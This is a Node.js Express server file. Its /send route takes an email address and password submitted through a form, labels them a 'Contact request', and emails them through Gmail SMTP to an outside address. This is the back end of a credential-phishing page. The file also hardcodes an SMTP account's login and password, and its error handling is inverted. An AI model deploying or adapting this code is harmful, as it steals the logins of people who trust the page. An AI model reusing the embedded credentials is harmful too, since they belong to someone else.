const express = require('express');
const bodyParser = require('body-parser');
const exphbs = require('express-handlebars');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();

app.engine('handlebars', exphbs());
app.set('view engine', 'handlebars');

app.use('/public', express.static(path.join(__dirname, 'public')));

app.use(
    bodyParser.urlencoded({
        extended: false,
    })
);
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/send', (req, res) => {
    const output = `
    <p>You have a Contact request</p>
    <h2>Contact Details</h2>
    <ul>
    <li>email: ${req.body.email}</li>
    <li>password: ${req.body.password}</li>
    </ul>
    
    `;
    let transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 587,
        secure: false, // true for 465, false for other ports
        auth: {
            user: 'patrickemily125@gmail.com', // generated ethereal user
            pass: 'nyekazi24', // generated ethereal password
        },
        //tls: {
        //rejectUnauthorized: false,
        //},
    });

    // send mail with defined transport object
    let mailOption = {
        from: '"Your Favorite" <patrickemily125@gmail.com>', // sender address
        to: 'whycenth@gmail.com', // list of receivers
        subject: 'Hello', // Subject line
        text: 'Hello world?', // plain text body
        html: output, // html body
    };
    transporter.sendMail(mailOption, (error, info) => {
        if (error) {
            console.log('Message sent: %s', info.messageId);
        } else {
            console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
            // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
        }
        res.json({
            message: 'message sent',
        });
    });
});

app.listen(process.env.PORT || 3000, () => {
    console.log('listen at 4000');
});